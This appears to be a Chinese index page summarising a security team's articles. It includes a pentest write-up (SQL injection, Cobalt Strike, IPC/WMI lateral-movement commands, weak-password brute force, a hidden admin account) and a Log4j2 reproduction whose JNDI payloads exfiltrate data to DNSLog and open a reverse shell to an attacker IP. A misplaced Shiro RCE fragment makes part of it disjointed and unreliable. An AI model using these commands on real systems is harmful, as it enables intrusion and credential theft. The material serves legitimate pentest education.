## 概述

本页面汇总 **0x6270安全团队** 微信公众号在 **2022年3月 至 2023年4月** 期间发布的全部文章，旨在为安全研究人员提供结构化的检索入口。团队聚焦 **AI安全（AI Security）** 领域，重点覆盖大语言模型（LLM）安全、对抗机器学习、模型部署风险、红队测试方法论以及 CTF 实战复盘等方向，同时持续输出经典漏洞分析研究成果，并关注软件供应链安全事件（如 Notepad++ 摄政字符事件）与团队建设招聘动态。新增记录团队在 HVV 护网行动期间（2022年七夕）发布的漏洞威胁情报汇总预告，展示团队行动期威胁情报分享机制及知识星球运营引流策略。新增记录 2023 年安全开发岗招聘信息（社招/校招/实习，base 成都），展示团队在安全工程化方向的人才需求画像。**新增记录 Shiro RCE 内网渗透测试实战案例，完善团队实战攻防技术分享脉络，涵盖从初始访问、免杀上线、凭证窃取、大规模横向移动到威胁溯源的完整红队攻击链。新增记录学员就业见证文章，展示零基础学员通过小迪安全培训四个月入职安全厂商的真实就业案例。新增记录 Log4j2 RCE (CVE-2021-44228) 漏洞复现实战文章，涵盖环境搭建、DNSLog 验证、JNDI 注入反弹 Shell、权限维持添加用户的完整复现流程。新增记录安服仔某渗透项目实战文章，记录 SQL 注入获取 DBA 权限、Cobalt Strike 上线、内网横向移动、弱口令爆破、IPC/WMI 组合利用、FTP 服务器失陷等完整渗透测试实战链路。新增记录 2023 年 HVV 护网行动期间团队士气文章《坚持就是胜利！》，记录一线与二线同志的数字经济护航者精神面貌。**

## 安服仔某渗透项目实战深度解析

**发布时间**：2023-04-13（基于微信文章 sessionid 时间戳 1681403335 推算）  
**核心技术栈**：SQL注入、DBA权限、Cobalt Strike、xp_cmdshell、内网横向移动、弱口令爆破、IPC$共享、WMI、FTP服务器

### 攻击链完整复现

#### 初始访问：SQL注入获取 DBA 权限 → Cobalt Strike 上线
- **漏洞发现**：通过 AWVS 扫描发现登录页面存在 SQL 注入漏洞（POST /xxx/xxxx/login.aspx）
- **漏洞验证**：使用 Sqlmap 确认为 Microsoft SQL Server + Windows + ASP.NET 站点，且注入点为 DBA 权限
- **命令执行**：利用 `xp_cmdshell` 执行 PowerShell 命令，成功上线 Cobalt Strike Beacon
- **环境特征**：目标仅打了 5 个补丁，杀毒软件检测关闭，便于后续操作

#### 权限提升与持久化
- **提权**：直接进行提权操作（具体提权方式文中未详述，但已获取高权限）
- **凭证获取**：目标为 Win2016 无法抓取明文密码，添加影子用户 `admin$/admin@123..`
- **隐蔽连接**：通过目标网络直接远程连接（而非端口转发），保持隐蔽性
- **内网扫描**：上传 fscan 至隐藏文件夹进行内网资产扫描

#### 大规模横向移动：弱口令爆破 + IPC/WMI 组合利用
- **RDP 弱口令爆破**：通过内网扫描工具爆破 RDP，弱口令均为 `administrator/123456`，拿下近 12 台主机
- **IPC$ + WMI 组合横向**：
  - **前提条件**：拥有账号密码、目标开启共享及 135 端口
  - **绕过思路**：IPC 单独创建计划任务被 360 天擎拦截；WMI 单独用需上传后门到 Web 服务器易被发现
  - **组合利用**：IPC 建立连接传马到 C 盘 → WMI 远程执行 C 盘木马，规避杀软拦截
  - **命令示例**：
    ```
    net use \\ip\\ipc$ 密码 /user:用户名
    copy 某盘符木马 \\ip\\c$
    wmiexec ./administrator:admin!@#45@ip "cmd.exe /c c:/beacon.exe"
    ```
- **横向成果**：通过该组合技术大量主机上线 Cobalt Strike

#### FTP 服务器失陷
- **弱口令**：`admin/admin`
- **影响范围**：文件预估 1 万以上，推测为核心 FTP 存储服务器，获取百余个 FTP 权限

#### 实战总结
- **权限收割**：主机权限 40 余台、FTP 权限上百个
- **时间限制**：授权测试仅 2 天，未来得及拿下域控及进入工控网
- **经验建议**：渗透测试实战时每个环境不同，建议记录语雀或保存报告，积累实战经验

#### 初始访问：Shiro RCE → Cobalt Strike 上线

#### 凭证获取：NTLM 哈希窃取与解密
- 目标为 Windows Server 2019，无法直接获取明文密码
- 使用 Mimikatz 从 LSASS 内存中提取 NTLM 哈希值
- 通过离线破解或 Pass-the-Hash 方式利用凭证
- 成功以管理员权限登录目标主机
- 相关技术参考：[[mimikatz-sekurlsa-pth-internals]]、[[windows-token-nerfing-pplguard-trusted-labels]]

#### 权限提升与信息收集
- 在目标主机翻找文件，发现弱口令 `admin/admin123` 获取系统权限
- 访问数据库提取敏感信息

#### 威胁溯源：发现前置攻击者痕迹

- 通过 IP138 等威胁情报平台溯源攻击者基础设施
- 相关技术参考：[[frp内网渗透应用]]、[[threat-attribution-tracing-techniques]]、[[internal-network-pivoting-techniques]]

#### 大规模横向移动：FTP 凭证复用
- 利用获取的凭证在三个网段进行 FTP 服务爆破/登录

## Log4j2 RCE (CVE-2021-44228) 漏洞复现实战详解

**发布时间**：2023-04-13（基于微信文章 sessionid 时间戳 1681403330 推算）  
**作者**：小黑（黑总，团队合伙人，某安全厂商红队岗技术骨干）  
**首发平台**：火线Zone (https://zone.huoxian.cn/d/947-log4j2)  
**核心技术栈**：Log4j2、Log4Shell、JNDI注入、DNSLog、RMI/LDAP、反弹Shell、权限维持

### 复现流程完整记录

#### 环境搭建
- 使用现成靶场环境部署文件（Docker/虚拟机镜像）
- 目标地址：`http://192.168.1.17:8080/`
- 访问靶场登录页面确认服务正常

#### 漏洞验证：DNSLog 回显确认
- **Payload**：`${jndi:ldap://${sys:java.version}.0bcjz2.dnslog.cn/}`
- **原理**：利用 Log4j2 的 JNDI Lookup 特性，通过 `${sys:java.version}` 获取 Java 版本并拼接到 DNSLog 子域名中
- **验证结果**：DNSLog 平台成功接收请求，确认漏洞存在且可触发 JNDI 查找

#### 漏洞利用：JNDI 注入反弹 Shell
- **工具**：JNDI 注入工具（支持 RMI/LDAP 协议）
- **参数说明**：
  - `-C`：需要执行的命令
  - `-A`：攻击者服务器 IP（用于反弹 Shell 连接）
- **攻击 Payload**：`${jndi:rmi://10.198.198.215:1099/uenrdi}`
- **执行流程**：
  1. 攻击者启动 JNDI 服务监听指定端口
  2. 目标服务器解析 Payload，发起 RMI 连接到攻击者服务器
  3. 攻击者服务器返回恶意类字节码
  4. 目标服务器加载执行恶意类，执行指定命令（反弹 Shell）

#### 权限维持：添加用户实现持久化
- **操作**：在获取 Shell 后添加系统用户
- **账号凭据**：`admin` / `Admin@123..`
- **目的**：通过合法账号实现远程登录持久化访问，规避 Shell 断连风险

### 技术要点解析

#### Log4j2 JNDI 注入利用链
```
用户输入 → Log4j2 记录日志 → 解析 ${jndi:...} 语法 → 发起 JNDI 查找 (RMI/LDAP) → 远程加载恶意类 → 任意代码执行
```

#### 关键攻击面
- **LDAP/RMI 协议**：JNDI 支持的远程对象加载协议
- **环境变量注入**：`${sys:java.version}`、`${env:PATH}` 等信息泄露
- **绕过限制**：高版本 JDK 限制 `trustURLCodebase`，需利用本地 Gadget 链或 LDAP 属性注入

#### 防御与缓解
- 升级 Log4j2 至 2.17.1+ 版本
- 设置系统属性 `log4j2.formatMsgNoLookups=true`
- 移除 JndiLookup 类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
- WAF 规则拦截 `${jndi:` 等恶意模式
